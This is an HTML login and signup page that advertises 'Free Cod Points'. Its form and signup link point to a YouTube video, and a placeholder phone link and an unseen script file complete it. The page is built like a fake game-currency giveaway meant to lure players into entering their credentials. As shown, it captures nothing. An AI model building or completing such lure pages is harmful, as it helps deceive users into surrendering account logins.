<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login and Signup</title>
    <style>
        body {
            font-family: 'Arial Black', Arial, sans-serif;
            background-color: #fff;
            color: #000;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        h1 {
            margin-top: 50px;
            text-align: center;
        }
        #loginContainer {
            background-color: #007bff;
            color: white;
            text-align: center;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
        }
        label {
            display: block;
            margin-bottom: 10px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 15px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #28a745; /* Green color for login button */
            color: #fff;
            cursor: pointer;
        }
        button:hover {
            background-color: #218838; /* Darker green on hover */
        }
        #signupLink {
            margin-top: 10px;
            color: green; /* Green color for signup text */
            cursor: pointer;
        }
        #logo {
            margin-top: 50px;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <a href="tel:YOUR-PHONE-NUMBER" id="logo">
        <h1>Free Cod Points</h1>
    </a>

    <div id="loginContainer">
        <form id="loginForm" action="https://youtu.be/HIcSWuKMwOw?si=Vs5Rn64pSKCSwCsU" method="get">
            <h2>Login</h2>
            <label for="username">Username:</label>
            <input type="text" id="username" required><br><br>
            <label for="password">Password:</label>
            <input type="password" id="password" required><br><br>
            <button type="submit">Login</button>
        </form>

        <div id="signupLink" onclick="window.location.href='https://youtu.be/HIcSWuKMwOw?si=Vs5Rn64pSKCSwCsU'">
            <p>Don't have an account? <span style="color: green;">Sign Up</span></p>
        </div>
    </div>

    <script src="accountSystem.js"></script>
</body>
</html>
